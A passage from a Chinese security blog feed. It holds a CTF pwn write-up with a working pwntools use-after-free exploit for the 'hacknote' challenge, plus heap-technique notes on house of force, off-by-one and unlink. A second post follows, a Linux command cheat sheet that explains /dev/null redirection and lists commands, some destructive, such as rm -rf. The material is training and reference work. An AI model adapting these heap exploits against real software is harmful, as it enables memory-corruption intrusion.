malloc(4)</code>，如果原来v1的大小也为4，那么v1原来的那块内存就会被分配给v2，通过v1可以（uaf）访问v2的内容。</p><p>F，A，U（先FREE,再修改chunk，调用chunk中的函数指针）。让两个指针实际指向同一个chunk，一个指针把内存解释为字符串，从而写入任意值，另一个指针把内存解释为函数指针，从而控制了EIP。</p></blockquote><h3 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h3><p>借鉴veritas501师傅的EXP，稍加修改和理解：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>bin <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#添加</span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#删除——free</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#打印</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#size随意，不等于8就行</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#content的大小不等于8（这是程序中note_chunk的大小,note_chunk就是第一次malloc的那个），是为了等会分配8 bytes的content不会被分配到之前的content的bin上，而是分配到note的bin上。</span><span class="token comment" spellcheck="true">#按照malloc和free机制，如果我们del_note换一下位置，先del_note(1)，note2_chunk会被放在原来的note0_chunk位置，而note3_content里的magic函数地址就会被放在note1_chunk位置，后面的print_note(0)，同样也需要改为print_note(1)，才能getshell</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>bin<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'magic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102214243.png" class="lazyload"></p><h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h2><h3 id="hof-house-of-force"><a href="#hof-house-of-force" class="headerlink" title="hof (house of force)"></a>hof (house of force)</h3><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="noopener">heap-exploitation——house of force参考链接</a></p><blockquote><p>引用m4x大佬博客原话：</p><p>简单说一下我对 hof 的理解，如果我们能控制 <strong>top_chunk</strong> 的 <strong>size</strong>，那么我们就可以通过控制 malloc 一些精心设计的<strong>大数/负数</strong>来实现控制 top_chunk 的指针，就可以实现任意地址写的效果，个人感觉，hof 的核心思想就在这个 force 上，疯狂 malloc，简单粗暴效果明显。</p></blockquote><h3 id="off-by-one漏洞"><a href="#off-by-one漏洞" class="headerlink" title="off_by_one漏洞"></a>off_by_one漏洞</h3><blockquote><p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">参考链接</a></p><p>一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。</p></blockquote><blockquote><p>==&gt; off-by-one总共可以分为两种利用方式:</p><p><strong>chunk overlapping</strong></p><ul><li><p>off-by-one overwrite allocated</p></li><li><p>off-by-one overwrite freed</p></li><li><p>off-by-one null byte</p></li></ul><p><strong>unlink</strong></p><ul><li><p>off-by-one small bin</p></li><li><p>off-by-one large bin</p></li></ul></blockquote><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">unlink——pdf</a></p><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>checksec it!</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102221726.png" class="lazyload"></p><p>开启了NX,Stack，同样无法通过常规方式来攻击。</p></blockquote><p>待更新。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>/dev/null和常用linux命令集</title>
      <link href="/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
      <url>/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>/dev/null和常用linux命令集。</p><a id="more"></a><h1 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h1><blockquote><p>😭因为忘了参考了哪些文章，所以如若有侵权之处，还请联系博主。</p></blockquote><h2 id="dev-null-与-重定向"><a href="#dev-null-与-重定向" class="headerlink" title="/dev/null 与 重定向"></a>/dev/null 与 重定向</h2><p>==&gt; /dev/null 是linux系统中的一个特殊文件设备，他的作用是接受一切输入它的数据并丢弃这些数据,通常被当做垃圾桶来用。将输出流重定向到/dev/null上面，就是丢弃这个输出流上的所有输出，/dev/null也叫linux中的黑洞。</p><p><strong>0:表示键盘输入(stdin)</strong></p><p><strong>1:表示标准输出(stdout),</strong>系统默认是1 </p><p><strong>2:表示错误输出(stderr)</strong> </p><pre class=" language-bash"><code class="language-bash"><span class="token string">"command >/dev/null 2>&amp;1 &amp;"</span>  与 <span class="token string">"command 1>/dev/null 2>&amp;1 &amp;"</span>  的意思一样1<span class="token punctuation">)</span> command:   表示shell命令或者为一个可执行程序2<span class="token punctuation">)</span> <span class="token operator">></span>:  表示重定向到哪里 3<span class="token punctuation">)</span> /dev/null:  表示Linux的空设备文件 4<span class="token punctuation">)</span> 2:  表示标准错误输出5<span class="token punctuation">)</span> <span class="token operator">&amp;</span>1:  <span class="token operator">&amp;</span>表示等同于的意思,  2<span class="token operator">></span><span class="token operator">&amp;</span>1表示2的输出重定向于16<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token keyword">:</span>  **表示后台执行,即这条指令执行在后台运行** </code></pre><p>==&gt; 比如 find -user root   2&gt;/dev/null  &gt;1.txt &amp;，就是将文件用户属性为root的文文件名及其路径重定向到文件1.txt中</p><p><strong>==&gt; 但是</strong> find -user root   1&gt;/dev/null 却是与上一条命令不同的，用的是标准输出流，不会显示在屏幕上，只能输出到文件中；如果加点东西上去变成 find -user root   1&gt;/dev/null 1&gt;&amp;2 那么标准输出流被重定向到标准错误输出流，就会在屏幕上显示查找到的信息了。</p><p>==&gt; 再比如 grep -Ri woshiflag.py 2&gt;/dev/null 1&gt;&amp;2 ,就是将与woshiflag.py脚本有关的文件列出，并且将标准输出流重定向到标准错误输出流,显示到屏幕上。</p><hr><pre class=" language-bash"><code class="language-bash">- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span>file- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><p><strong>不同点: I/O效率上的差异</strong> </p><p> ==&gt; command 1&gt;file 2&gt;file 这样的写法,stdout和stderr都直接送到file中, file会被打开两次,这样stdout和stderr会互相覆盖,这样写相当使用了FD1和FD2两个同时去抢占file的管道。 </p><p>==&gt; command 1&gt;file 2&gt;&amp;1 这条命令就将stdout直接送向file, stderr 继承了FD1管道后,再被送往file,此时,file只被打开了一次,也只使用了一个管道FD1,它包括了stdout和stderr的内容。</p><p>==&gt; 从I/O 效率上,前一条命令的效率要比后面一条的命令效率要低,所以在编写shell脚本的时候,最多的时候我们会command 1&gt;file 2&gt;&amp;1 这样的写法， 或 “command &gt;file 2&amp;1” </p><h1 id="linux-常用命令集"><a href="#linux-常用命令集" class="headerlink" title="linux 常用命令集"></a>linux 常用命令集</h1><h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><pre class=" language-bash"><code class="language-bash">arch 显示机器的处理器架构<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">uname</span> -m 显示机器的处理器架构<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">uname</span> -r 显示正在使用的内核版本 dmidecode -q 显示硬件系统部件 - <span class="token punctuation">(</span>SMBIOS / DMI<span class="token punctuation">)</span> hdparm -i /dev/hda 罗列一个磁盘的架构特性 hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 <span class="token function">cat</span> /proc/cpuinfo 显示CPU info的信息 <span class="token function">cat</span> /proc/interrupts 显示中断 <span class="token function">cat</span> /proc/meminfo 校验内存使用 <span class="token function">cat</span> /proc/swaps 显示哪些swap被使用 <span class="token function">cat</span> /proc/version 显示内核的版本 <span class="token function">cat</span> /proc/net/dev 显示网络适配器及统计 <span class="token function">cat</span> /proc/mounts 显示已加载的文件系统 lspci -tv 罗列 PCI 设备 lsusb -tv 显示 USB 设备 <span class="token function">date</span> 显示系统日期 <span class="token function">cal</span> 2007 显示2007年的日历表 <span class="token function">date</span> 041217002007.00 设置日期和时间 - 月日时分年.秒 clock -w 将时间修改保存到 BIOS关机 <span class="token punctuation">(</span>系统的关机、重启以及登出 <span class="token punctuation">)</span> <span class="token function">shutdown</span> -h now 关闭系统<span class="token punctuation">(</span>1<span class="token punctuation">)</span> init 0 关闭系统<span class="token punctuation">(</span>2<span class="token punctuation">)</span> telinit 0 关闭系统<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token function">shutdown</span> -h hours:minutes <span class="token operator">&amp;</span> 按预定时间关闭系统 <span class="token function">shutdown</span> -c 取消按预定时间关闭系统 <span class="token function">shutdown</span> -r now 重启<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">reboot</span> 重启<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">logout</span> 注销</code></pre><h2 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /home 进入 <span class="token string">'/ home'</span> 目录<span class="token string">' cd .. 返回上一级目录 cd ../.. 返回上两级目录 cd 进入个人的主目录 cd ~user1 进入个人的主目录 cd - 返回上次所在的目录 pwd 显示工作路径 ls 查看目录中的文件 ls -F 查看目录中的文件 ls -l 显示文件和目录的详细资料 ls -a 显示隐藏文件 ls *[0-9]* 显示包含数字的文件名和目录名 tree 显示文件和目录由根目录开始的树形结构(1) lstree 显示文件和目录由根目录开始的树形结构(2) mkdir dir1 创建一个叫做 '</span>dir1<span class="token string">' 的目录'</span> <span class="token function">mkdir</span> dir1 dir2 同时创建两个目录 <span class="token function">mkdir</span> -p /tmp/dir1/dir2 创建一个目录树 <span class="token function">rm</span> -f file1 删除一个叫做 <span class="token string">'file1'</span> 的文件<span class="token string">' rmdir dir1 删除一个叫做 '</span>dir1<span class="token string">' 的目录'</span> <span class="token function">rm</span> -rf dir1 删除一个叫做 <span class="token string">'dir1'</span> 的目录并同时删除其内容 <span class="token function">rm</span> -rf dir1 dir2 同时删除两个目录及它们的内容 <span class="token function">mv</span> dir1 new_dir 重命名/移动 一个目录 <span class="token function">cp</span> file1 file2 复制一个文件 <span class="token function">cp</span> dir/* <span class="token keyword">.</span> 复制一个目录下的所有文件到当前工作目录 <span class="token function">cp</span> -a /tmp/dir1 <span class="token keyword">.</span> 复制一个目录到当前工作目录 <span class="token function">cp</span> -a dir1 dir2 复制一个目录 <span class="token function">ln</span> -s file1 lnk1 创建一个指向文件或目录的软链接 <span class="token function">ln</span> file1 lnk1 创建一个指向文件或目录的物理链接 <span class="token function">touch</span> -t 0712250000 file1 修改一个文件或目录的时间戳 - <span class="token punctuation">(</span>YYMMDDhhmm<span class="token punctuation">)</span> <span class="token function">file</span> file1 outputs the mime <span class="token function">type</span> of the <span class="token function">file</span> as text <span class="token function">iconv</span> -l 列出已知的编码 <span class="token function">iconv</span> -f fromEncoding -t toEncoding inputFile <span class="token operator">></span> outputFile creates a new from the given input <span class="token function">file</span> by assuming it is encoded <span class="token keyword">in</span> fromEncoding and converting it to toEncoding. <span class="token function">find</span> <span class="token keyword">.</span> -maxdepth 1 -name *.jpg -print -exec convert <span class="token string">"{}"</span> -resize 80x60 <span class="token string">"thumbs/{}"</span> \<span class="token punctuation">;</span> batch resize files <span class="token keyword">in</span> the current directory and send them to a thumbnails directory <span class="token punctuation">(</span>requires convert from Imagemagick<span class="token punctuation">)</span></code></pre><h2 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -name file1 从 <span class="token string">'/'</span> 开始进入根文件系统搜索文件和目录 <span class="token function">find</span> / -user user1 搜索属于用户 <span class="token string">'user1'</span> 的文件和目录 <span class="token function">find</span> /home/user1 -name \*.bin 在目录 <span class="token string">'/ home/user1'</span> 中搜索带有<span class="token string">'.bin'</span> 结尾的文件 <span class="token function">find</span> /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件 <span class="token function">find</span> /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 <span class="token function">find</span> / -name \*.rpm -exec <span class="token function">chmod</span> 755 <span class="token string">'{}'</span> \<span class="token punctuation">;</span> 搜索以 <span class="token string">'.rpm'</span> 结尾的文件并定义其权限 <span class="token function">find</span> / -xdev -name \*.rpm 搜索以 <span class="token string">'.rpm'</span> 结尾的文件，忽略光驱、捷盘等可移动设备 <span class="token function">locate</span> \*.ps 寻找以 <span class="token string">'.ps'</span> 结尾的文件 - 先运行 <span class="token string">'updatedb'</span> 命令 <span class="token function">whereis</span> halt 显示一个二进制文件、源码或man的位置 <span class="token function">which</span> halt 显示一个二进制文件或可执行文件的完整路径</code></pre><h2 id="挂载一个文件系统"><a href="#挂载一个文件系统" class="headerlink" title="挂载一个文件系统"></a>挂载一个文件系统</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">mount</span> /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 <span class="token string">'/ mnt/hda2'</span> 已经存在 <span class="token function">umount</span> /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 <span class="token string">'/ mnt/hda2'</span> 退出 <span class="token function">fuser</span> -km /mnt/hda2 当设备繁忙时强制卸载 <span class="token function">umount</span> -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用 <span class="token function">mount</span> /dev/fd0 /mnt/floppy 挂载一个软盘 <span class="token function">mount</span> /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom <span class="token function">mount</span> /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom <span class="token function">mount</span> /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom <span class="token function">mount</span> -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件 <span class="token function">mount</span> -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 <span class="token function">mount</span> /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备 <span class="token function">mount</span> -t smbfs -o username<span class="token operator">=</span>user,password<span class="token operator">=</span>pass //WinClient/share /mnt/share 挂载一个windows网络共享</code></pre><h2 id="磁盘空间"><a href="#磁盘空间" class="headerlink" title="磁盘空间"></a>磁盘空间</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">df</span> -h 显示已经挂载的分区列表 <span class="token function">ls</span> -lSr <span class="token operator">|</span><span class="token function">more</span> 以尺寸大小排列文件和目录 <span class="token function">du</span> -sh dir1 估算目录 <span class="token string">'dir1'</span> 已经使用的磁盘空间<span class="token string">' du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 rpm -q -a --qf '</span>%10<span class="token punctuation">{</span>SIZE<span class="token punctuation">}</span>t%<span class="token punctuation">{</span>NAME<span class="token punctuation">}</span>n<span class="token string">' | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) dpkg-query -W -f='</span>Installed−Size<span class="token punctuation">;</span>10tInstalled−Size<span class="token punctuation">;</span>10t<span class="token punctuation">{</span>Package<span class="token punctuation">}</span>n' <span class="token operator">|</span> <span class="token function">sort</span> -k1,1n 以大小为依据显示已安装的deb包所使用的空间 <span class="token punctuation">(</span>ubuntu, debian类系统<span class="token punctuation">)</span></code></pre><h2 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">groupadd</span> group_name 创建一个新用户组 <span class="token function">groupdel</span> group_name 删除一个用户组 <span class="token function">groupmod</span> -n new_group_name old_group_name 重命名一个用户组 <span class="token function">useradd</span> -c <span class="token string">"Name Surname "</span> -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 <span class="token string">"admin"</span> 用户组的用户 <span class="token function">useradd</span> user1 创建一个新用户 <span class="token function">userdel</span> -r user1 删除一个用户 <span class="token punctuation">(</span> <span class="token string">'-r'</span> 排除主目录<span class="token punctuation">)</span> <span class="token function">usermod</span> -c <span class="token string">"User FTP"</span> -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性 <span class="token function">passwd</span> 修改口令 <span class="token function">passwd</span> user1 修改一个用户的口令 <span class="token punctuation">(</span>只允许root执行<span class="token punctuation">)</span> chage -E 2005-12-31 user1 设置用户口令的失效期限 pwck 检查 <span class="token string">'/etc/passwd'</span> 的文件格式和语法修正以及存在的用户 grpck 检查 <span class="token string">'/etc/passwd'</span> 的文件格式和语法修正以及存在的群组 newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组</code></pre><h2 id="文件的权限"><a href="#文件的权限" class="headerlink" title="文件的权限"></a>文件的权限</h2><pre class=" language-bash"><code class="language-bash">-——使用 <span class="token string">"+"</span> 设置权限，使用 <span class="token string">"-"</span> 用于取消 <span class="token function">ls</span> -lh 显示权限 <span class="token function">ls</span> /tmp <span class="token operator">|</span> <span class="token function">pr</span> -T5 -W<span class="token variable">$COLUMNS</span> 将终端划分成5栏显示 <span class="token function">chmod</span> ugo+rwx directory1 设置目录的所有人<span class="token punctuation">(</span>u<span class="token punctuation">)</span>、群组<span class="token punctuation">(</span>g<span class="token punctuation">)</span>以及其他人<span class="token punctuation">(</span>o<span class="token punctuation">)</span>以读（r ）、写<span class="token punctuation">(</span>w<span class="token punctuation">)</span>和执行<span class="token punctuation">(</span>x<span class="token punctuation">)</span>的权限 <span class="token function">chmod</span> go-rwx directory1 删除群组<span class="token punctuation">(</span>g<span class="token punctuation">)</span>与其他人<span class="token punctuation">(</span>o<span class="token punctuation">)</span>对目录的读写执行权限 <span class="token function">chown</span> user1 file1 改变一个文件的所有人属性 <span class="token function">chown</span> -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 <span class="token function">chgrp</span> group1 file1 改变文件的群组 <span class="token function">chown</span> user1:group1 file1 改变一个文件的所有人和群组属性 <span class="token function">find</span> / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 <span class="token function">chmod</span> u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限 <span class="token function">chmod</span> u-s /bin/file1 禁用一个二进制文件的 SUID位 <span class="token function">chmod</span> g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的 <span class="token function">chmod</span> g-s /home/public 禁用一个目录的 SGID 位 <span class="token function">chmod</span> o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件 <span class="token function">chmod</span> o-t /home/public 禁用一个目录的 STIKY 位</code></pre><h2 id="文件的特殊属性"><a href="#文件的特殊属性" class="headerlink" title="文件的特殊属性"></a>文件的特殊属性</h2><pre class=" language-bash"><code class="language-bash">—— 使用 <span class="token string">"+"</span> 设置权限，使用 <span class="token string">"-"</span> 用于取消 chattr +a file1 只允许以追加方式读写文件 chattr +c file1 允许这个文件能被内核自动压缩/解压 chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 chattr +s file1 允许一个文件被安全地删除 chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 lsattr 显示特殊的属性</code></pre><h2 id="打包和压缩文件"><a href="#打包和压缩文件" class="headerlink" title="打包和压缩文件"></a>打包和压缩文件</h2><pre class=" language-bash"><code class="language-bash">bunzip2 file1.bz2 解压一个叫做 <span class="token string">'file1.bz2'</span>的文件 <span class="token function">bzip2</span> file1 压缩一个叫做 <span class="token string">'file1'</span> 的文件 gunzip file1.gz 解压一个叫做 <span class="token string">'file1.gz'</span>的文件 <span class="token function">gzip</span> file1 压缩一个叫做 <span class="token string">'file1'</span>的文件 <span class="token function">gzip</span> -9 file1 最大程度压缩 <span class="token function">rar</span> a file1.rar test_file 创建一个叫做 <span class="token string">'file1.rar'</span> 的包 <span class="token function">rar</span> a file1.rar file1 file2 dir1 同时压缩 <span class="token string">'file1'</span>, <span class="token string">'file2'</span> 以及目录 <span class="token string">'dir1'</span> <span class="token function">rar</span> x file1.rar 解压rar包 <span class="token function">unrar</span> x file1.rar 解压rar包 <span class="token function">tar</span> -cvf archive.tar file1 创建一个非压缩的 tarball <span class="token function">tar</span> -cvf archive.tar file1 file2 dir1 创建一个包含了 <span class="token string">'file1'</span>, <span class="token string">'file2'</span> 以及 <span class="token string">'dir1'</span>的档案文件 <span class="token function">tar</span> -tf archive.tar 显示一个包中的内容 <span class="token function">tar</span> -xvf archive.tar 释放一个包 <span class="token function">tar</span> -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下 <span class="token function">tar</span> -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包 <span class="token function">tar</span> -xvfj archive.tar.bz2 解压一个bzip2格式的压缩包 <span class="token function">tar</span> -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包 <span class="token function">tar</span> -xvfz archive.tar.gz 解压一个gzip格式的压缩包 <span class="token function">zip</span> file1.zip file1 创建一个zip格式的压缩包 <span class="token function">zip</span> -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 unzip file1.zip 解压一个zip格式压缩包RPM 包 - （Fedora, Redhat及类似系统） rpm -ivh package.rpm 安装一个rpm包 rpm -ivh --nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告 rpm -U package.rpm 更新一个rpm包但不改变其配置文件 rpm -F package.rpm 更新一个确定已经安装的rpm包 rpm -e package_name.rpm 删除一个rpm包 rpm -qa 显示系统中所有已经安装的rpm包 rpm -qa <span class="token operator">|</span> <span class="token function">grep</span> httpd 显示所有名称中包含 <span class="token string">"httpd"</span> 字样的rpm包 rpm -qi package_name 获取一个已安装包的特殊信息 rpm -qg <span class="token string">"System Environment/Daemons"</span> 显示一个组件的rpm包 rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表 rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表 rpm -q package_name --whatrequires 显示与一个rpm包存在依赖关系的列表 rpm -q package_name --whatprovides 显示一个rpm包所占的体积 rpm -q package_name --**s 显示在安装/删除期间所执行的脚本l rpm -q package_name --changelog 显示一个rpm包的修改历史 rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 rpm --import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 rpm --checksig package.rpm 确认一个rpm包的完整性 rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性 rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间 rpm -Va 检查系统中所有已安装的rpm包- 小心使用 rpm -Vp package.rpm 确认一个rpm包还未安装 rpm2cpio package.rpm <span class="token operator">|</span> cpio --extract --make-directories *bin* 从一个rpm包运行可执行文件 rpm -ivh /usr/src/redhat/RPMS/<span class="token variable"><span class="token variable">`</span>arch<span class="token variable">`</span></span>/package.rpm 从一个rpm源码安装一个构建好的包 rpmbuild --rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包YUM 软件包升级器 - （Fedora, RedHat及类似系统） yum <span class="token function">install</span> package_name 下载并安装一个rpm包 yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系 yum update package_name.rpm 更新当前系统中所有安装的rpm包 yum update package_name 更新一个rpm包 yum remove package_name 删除一个rpm包 yum list 列出当前系统中安装的所有包 yum search package_name 在rpm仓库中搜寻软件包 yum clean packages 清理rpm缓存删除下载的包 yum clean headers 删除所有头文件 yum clean all 删除所有缓存的包和头文件DEB 包 <span class="token punctuation">(</span>Debian, Ubuntu 以及类似系统<span class="token punctuation">)</span> dpkg -i package.deb 安装/更新一个 deb 包 dpkg -r package_name 从系统删除一个 deb 包 dpkg -l 显示系统中所有已经安装的 deb 包 dpkg -l <span class="token operator">|</span> <span class="token function">grep</span> httpd 显示所有名称中包含 <span class="token string">"httpd"</span> 字样的deb包 dpkg -s package_name 获得已经安装在系统中一个特殊包的信息 dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表 dpkg --contents package.deb 显示尚未安装的一个包所提供的文件列表 dpkg -S /bin/ping 确认所给的文件由哪个deb包提供APT 软件工具 <span class="token punctuation">(</span>Debian, Ubuntu 以及类似系统<span class="token punctuation">)</span> <span class="token function">apt-get</span> <span class="token function">install</span> package_name 安装/更新一个 deb 包 apt-cdrom <span class="token function">install</span> package_name 从光盘安装/更新一个 deb 包 <span class="token function">apt-get</span> update 升级列表中的软件包 <span class="token function">apt-get</span> upgrade 升级所有已安装的软件 <span class="token function">apt-get</span> remove package_name 从系统删除一个deb包 <span class="token function">apt-get</span> check 确认依赖的软件仓库正确 <span class="token function">apt-get</span> clean 从下载的软件包中清理缓存 apt-cache search searched-package 返回包含所要搜索字符串的软件包名称返回顶部索引 ^查看文件内容 <span class="token function">cat</span> file1 从第一个字节开始正向查看文件的内容 tac file1 从最后一行开始反向查看一个文件的内容 <span class="token function">more</span> file1 查看一个长文件的内容 <span class="token function">less</span> file1 类似于 <span class="token string">'more'</span> 命令，但是它允许在文件中和正向操作一样的反向操作 <span class="token function">head</span> -2 file1 查看一个文件的前两行 <span class="token function">tail</span> -2 file1 查看一个文件的最后两行 <span class="token function">tail</span> -f /var/log/messages 实时查看被添加到一个文件中的内容</code></pre><h2 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> file1 file2 <span class="token punctuation">..</span>. <span class="token operator">|</span> <span class="token function">command</span> <span class="token operator">&lt;</span><span class="token operator">></span> file1_in.txt_or_file1_out.txt general syntax <span class="token 